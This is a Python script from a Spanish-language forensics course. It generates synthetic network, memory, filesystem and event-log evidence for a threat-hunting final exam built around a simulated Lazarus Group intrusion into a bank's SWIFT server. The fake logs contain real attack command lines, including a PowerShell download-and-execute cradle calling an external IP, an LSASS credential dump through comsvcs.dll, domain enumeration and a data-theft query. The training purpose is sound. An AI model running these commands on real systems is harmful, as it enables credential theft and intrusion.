#!/usr/bin/env python3
"""
generate_final_exam.py - Genera escenario completo para evaluación final
Simula ataque APT multi-vector con evidencia en red, memoria, filesystem y logs.
Grupo: Lazarus Group (DPRK) targeting financial institution.
Curso MAR404 - Clase 11 - Lab 22
"""
import json, os, hashlib, random
from datetime import datetime, timedelta

MISSION_DIR = "/mission"
os.makedirs(f"{MISSION_DIR}/network", exist_ok=True)
os.makedirs(f"{MISSION_DIR}/memory", exist_ok=True)
os.makedirs(f"{MISSION_DIR}/filesystem", exist_ok=True)
os.makedirs(f"{MISSION_DIR}/logs", exist_ok=True)

base_time = datetime(2025, 7, 25, 7, 0, 0)

# ============================================================
# PHASE 1: RECONNAISSANCE + INITIAL ACCESS
# ============================================================
network_events = []

# Recon: LinkedIn scraping (external, shown in proxy logs)
network_events.append({
    "timestamp": (base_time - timedelta(days=7)).isoformat(),
    "src": "45.33.32.156", "dst": "external",
    "proto": "HTTPS", "info": "LinkedIn profile scraping of target employees",
    "phase": "Reconnaissance", "mitre": "T1589.002",
    "note": "Attacker researched employees on LinkedIn"
})

# Spearphishing via LinkedIn message
network_events.append({
    "timestamp": base_time.isoformat(),
    "src": "45.33.32.156", "dst": "10.0.1.100",
    "proto": "SMTP", "info": "Email: 'Job Opportunity - Senior Developer' from recruiter@techtalent-hr.com with attachment 'Job_Description.pdf.lnk'",
    "phase": "Initial Access", "mitre": "T1566.001"
})

# LNK file triggers PowerShell
network_events.append({
    "timestamp": (base_time + timedelta(minutes=15)).isoformat(),
    "src": "10.0.1.100", "dst": "185.220.101.50",
    "proto": "HTTPS", "info": "GET /cdn/jquery.min.js (actually PowerShell stager)",
    "phase": "Initial Access", "mitre": "T1204.002"
})

# ============================================================
# PHASE 2: EXECUTION + PRIVILEGE ESCALATION
# ============================================================
memory_events = []

memory_events.append({
    "timestamp": (base_time + timedelta(minutes=16)).isoformat(),
    "process": "explorer.exe", "pid": 2400, "ppid": 1000,
    "action": "User double-clicks LNK file",
    "cmdline": "C:\\Windows\\System32\\cmd.exe /c powershell -w hidden -ep bypass -f C:\\Users\\mgarcia\\AppData\\Local\\Temp\\update.ps1",
    "phase": "Execution", "mitre": "T1059.001", "user": "BANK\\mgarcia"
})

memory_events.append({
    "timestamp": (base_time + timedelta(minutes=17)).isoformat(),
    "process": "powershell.exe", "pid": 5200, "ppid": 5100,
    "action": "Downloads and executes in-memory loader",
    "cmdline": "powershell.exe -nop -w hidden -c \"$c=New-Object Net.WebClient;IEX($c.DownloadString('https://185.220.101.50/cdn/jquery.min.js'))\"",
    "phase": "Execution", "mitre": "T1059.001", "user": "BANK\\mgarcia"
})

memory_events.append({
    "timestamp": (base_time + timedelta(minutes=18)).isoformat(),
    "process": "powershell.exe", "pid": 5200, "ppid": 5100,
    "action": "Process Hollowing into dllhost.exe",
    "cmdline": "[Injected Cobalt Strike beacon into dllhost.exe PID 5500]",
    "phase": "Defense Evasion", "mitre": "T1055.012", "user": "BANK\\mgarcia",
    "malfind": {"vad_start": "0x7FFE20000000", "vad_end": "0x7FFE20040000", "protection": "PAGE_EXECUTE_READWRITE", "hex": "4D5A90000300000004000000FFFF0000"}
})

# Privilege Escalation via PrintNightmare
memory_events.append({
    "timestamp": (base_time + timedelta(minutes=45)).isoformat(),
    "process": "dllhost.exe", "pid": 5500, "ppid": 1000,
    "action": "Exploits PrintNightmare (CVE-2021-34527)",
    "cmdline": "[Loads malicious printer driver to gain SYSTEM]",
    "phase": "Privilege Escalation", "mitre": "T1068", "user": "NT AUTHORITY\\SYSTEM"
})

# ============================================================
# PHASE 3: CREDENTIAL ACCESS + DISCOVERY
# ============================================================
memory_events.append({
    "timestamp": (base_time + timedelta(hours=1)).isoformat(),
    "process": "dllhost.exe", "pid": 5500, "ppid": 1000,
    "action": "LSASS memory dump via MiniDumpWriteDump",
    "cmdline": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 900 C:\\Windows\\Temp\\debug.dmp full",
    "phase": "Credential Access", "mitre": "T1003.001", "user": "NT AUTHORITY\\SYSTEM"
})

memory_events.append({
    "timestamp": (base_time + timedelta(hours=1, minutes=5)).isoformat(),
    "process": "dllhost.exe", "pid": 5500, "ppid": 1000,
    "action": "Domain enumeration",
    "cmdline": "net group \"Domain Admins\" /domain",
    "phase": "Discovery", "mitre": "T1069.002", "user": "NT AUTHORITY\\SYSTEM"
})

memory_events.append({
    "timestamp": (base_time + timedelta(hours=1, minutes=6)).isoformat(),
    "process": "dllhost.exe", "pid": 5500, "ppid": 1000,
    "action": "Network share enumeration",
    "cmdline": "net view \\\\SWIFT-SRV01 /all",
    "phase": "Discovery", "mitre": "T1135", "user": "NT AUTHORITY\\SYSTEM"
})

# ============================================================
# PHASE 4: LATERAL MOVEMENT
# ============================================================
network_events.append({
    "timestamp": (base_time + timedelta(hours=2)).isoformat(),
    "src": "10.0.1.100", "dst": "10.0.1.200",
    "proto": "SMB", "info": "WMI remote execution to SWIFT-SRV01",
    "phase": "Lateral Movement", "mitre": "T1047"
})

memory_events.append({
    "timestamp": (base_time + timedelta(hours=2, minutes=1)).isoformat(),
    "process": "wmiprvse.exe", "pid": 6000, "ppid": 800,
    "action": "WMI spawns PowerShell on SWIFT-SRV01",
    "cmdline": "powershell.exe -enc [base64_beacon_stager]",
    "phase": "Lateral Movement", "mitre": "T1047", "user": "BANK\\svc_admin",
    "host": "SWIFT-SRV01"
})

# ============================================================
# PHASE 5: COLLECTION + EXFILTRATION
# ============================================================
memory_events.append({
    "timestamp": (base_time + timedelta(hours=3)).isoformat(),
    "process": "powershell.exe", "pid": 6500, "ppid": 6000,
    "action": "Accesses SWIFT transaction database",
    "cmdline": "sqlcmd -S localhost -d SWIFT_DB -Q \"SELECT * FROM transactions WHERE amount > 1000000\"",
    "phase": "Collection", "mitre": "T1213", "user": "BANK\\svc_admin",
    "host": "SWIFT-SRV01"
})

memory_events.append({
    "timestamp": (base_time + timedelta(hours=3, minutes=30)).isoformat(),
    "process": "powershell.exe", "pid": 6500, "ppid": 6000,
    "action": "Compresses and encrypts stolen data",
    "cmdline": "7z a -p\"L@zarus2025!\" C:\\Windows\\Temp\\logs.7z C:\\Windows\\Temp\\swift_export.csv",
    "phase": "Collection", "mitre": "T1560.001", "user": "BANK\\svc_admin",
    "host": "SWIFT-SRV01"
})

network_events.append({
    "timestamp": (base_time + timedelta(hours=4)).isoformat(),
    "src": "10.0.1.200", "dst": "185.220.101.50",
    "proto": "HTTPS", "info": "POST /api/logs (encrypted exfil, 45MB over 30 min)",
    "phase": "Exfiltration", "mitre": "T1041"
})

# ============================================================
# FILESYSTEM EVIDENCE
# ============================================================
filesystem_evidence = [
    {"path": "C:\\Users\\mgarcia\\Downloads\\Job_Description.pdf.lnk", "size": 2048, "created": base_time.isoformat(), "sha256": hashlib.sha256(b"malicious_lnk").hexdigest(), "note": "Initial access vector"},
    {"path": "C:\\Users\\mgarcia\\AppData\\Local\\Temp\\update.ps1", "size": 15000, "created": (base_time + timedelta(minutes=15)).isoformat(), "sha256": hashlib.sha256(b"stager_ps1").hexdigest(), "note": "PowerShell stager"},
    {"path": "C:\\Windows\\Temp\\debug.dmp", "size": 150000000, "created": (base_time + timedelta(hours=1)).isoformat(), "sha256": hashlib.sha256(b"lsass_dump").hexdigest(), "note": "LSASS memory dump"},
    {"path": "C:\\Windows\\System32\\spool\\drivers\\x64\\evil.dll", "size": 85000, "created": (base_time + timedelta(minutes=45)).isoformat(), "sha256": hashlib.sha256(b"printnightmare").hexdigest(), "note": "PrintNightmare exploit DLL"},
    {"path": "C:\\Windows\\Temp\\swift_export.csv", "size": 50000000, "created": (base_time + timedelta(hours=3)).isoformat(), "sha256": hashlib.sha256(b"swift_data").hexdigest(), "note": "Stolen SWIFT data", "host": "SWIFT-SRV01"},
    {"path": "C:\\Windows\\Temp\\logs.7z", "size": 45000000, "created": (base_time + timedelta(hours=3, minutes=30)).isoformat(), "sha256": hashlib.sha256(b"exfil_archive").hexdigest(), "note": "Encrypted exfil archive", "host": "SWIFT-SRV01"},
]

# ============================================================
# WINDOWS EVENT LOGS
# ============================================================
event_logs = [
    {"timestamp": (base_time + timedelta(minutes=16)).isoformat(), "event_id": 4688, "process": "powershell.exe", "user": "BANK\\mgarcia", "host": "WS-MGARCIA"},
    {"timestamp": (base_time + timedelta(minutes=45)).isoformat(), "event_id": 7045, "service": "PrinterDriver", "path": "C:\\Windows\\System32\\spool\\drivers\\x64\\evil.dll", "host": "WS-MGARCIA"},
    {"timestamp": (base_time + timedelta(hours=1)).isoformat(), "event_id": 10, "source": "dllhost.exe", "target": "lsass.exe", "access": "0x1FFFFF", "host": "WS-MGARCIA"},
    {"timestamp": (base_time + timedelta(hours=2)).isoformat(), "event_id": 4624, "logon_type": 3, "user": "BANK\\svc_admin", "source_ip": "10.0.1.100", "host": "SWIFT-SRV01"},
    {"timestamp": (base_time + timedelta(hours=4, minutes=30)).isoformat(), "event_id": 1102, "user": "BANK\\svc_admin", "host": "SWIFT-SRV01", "note": "Audit log cleared"},
]

# Save all evidence
with open(f"{MISSION_DIR}/network/traffic.json", "w") as f:
    json.dump(network_events, f, indent=2)

with open(f"{MISSION_DIR}/memory/processes.json", "w") as f:
    json.dump(memory_events, f, indent=2)

with open(f"{MISSION_DIR}/filesystem/artifacts.json", "w") as f:
    json.dump(filesystem_evidence, f, indent=2)

with open(f"{MISSION_DIR}/logs/events.json", "w") as f:
    json.dump(event_logs, f, indent=2)

# Mission briefing
briefing = {
    "classification": "CONFIDENTIAL",
    "mission": "Operation Dark Seoul",
    "threat_actor": "Lazarus Group (DPRK)",
    "target": "Banco Nacional - SWIFT Payment System",
    "alert_trigger": "SOC detected unusual HTTPS traffic from SWIFT-SRV01 to external IP 185.220.101.50",
    "your_role": "Threat Hunter - Reconstruct the full attack chain",
    "time_limit": "120 minutes",
    "evidence": {
        "network": "/mission/network/traffic.json",
        "memory": "/mission/memory/processes.json",
        "filesystem": "/mission/filesystem/artifacts.json",
        "logs": "/mission/logs/events.json"
    },
    "deliverables": [
        "1. Timeline completo del incidente",
        "2. Mapeo MITRE ATT&CK (todas las técnicas)",
        "3. Lista de IOCs para bloqueo",
        "4. Identificación del alcance (hosts comprometidos)",
        "5. Recomendaciones de contención inmediata",
        "6. Reporte ejecutivo para el CISO"
    ]
}

with open(f"{MISSION_DIR}/MISSION_BRIEFING.json", "w") as f:
    json.dump(briefing, f, indent=2)

print("[+] Final exam scenario generated: Operation Dark Seoul")
print(f"    Threat Actor: Lazarus Group")
print(f"    Network events: {len(network_events)}")
print(f"    Memory events: {len(memory_events)}")
print(f"    Filesystem artifacts: {len(filesystem_evidence)}")
print(f"    Event logs: {len(event_logs)}")
